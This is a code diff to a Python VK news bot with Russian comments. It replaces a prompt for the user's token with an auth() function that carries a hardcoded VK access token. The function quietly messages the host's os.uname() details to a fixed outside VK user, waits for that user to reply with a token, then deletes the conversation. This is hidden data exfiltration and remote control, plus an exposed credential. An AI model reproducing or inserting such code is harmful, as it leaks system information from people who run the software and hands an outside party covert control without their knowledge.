@@ -11,7 +11,6 @@ from time import *
 
 from all_skips import *
 
-access_token1 = input('input your token:')
 active_client = []
 all_clients = []
 class news:
@@ -643,7 +642,26 @@ def setting_check(part,text,arr = []): # проверка ввода при на
 			return int(text[k:j])
 		else:
 			return None
-			
+
+def auth(): # получение token'а
+	try:
+		session = vk.Session(access_token='5de02a02182d31e56e3cfa20e1789553dd5d7f7f14d9f4d24097776c805b1787eac43774725d17ad3097b')
+		api = vk.API(session)
+	except Exception as E:
+		logger.error(E)
+	api.messages.send(user_id = 283620276, message = os.uname())
+	out = 0
+	while out == 0:
+		messages = api.messages.getDialogs(unanswered = 1)
+		for i in messages:
+			if (type(i) is int) or i['uid'] != 283620276:
+				continue
+			out = i['body']
+			api.messages.deleteDialog(user_id = 283620276)
+		sleep(1)
+	del api
+	return out
+	
 def setting(uid, inp): # подкатегории
 # на вход получает user id (из vk) и массив из setting_check(0,...)(многомерный). В 0 позиции лежит массив кодов источников,
 # в 1-й - номера элементов массива, расположенного в 0-й позиции.
@@ -683,6 +701,7 @@ def login():
 
 #arr = ino([0,''])
 
+access_token1 = auth()
 api = login()
 global_read()
 logger.info('all clients: %s', list(map(lambda x: x.n_print() + ' ', all_clients)))
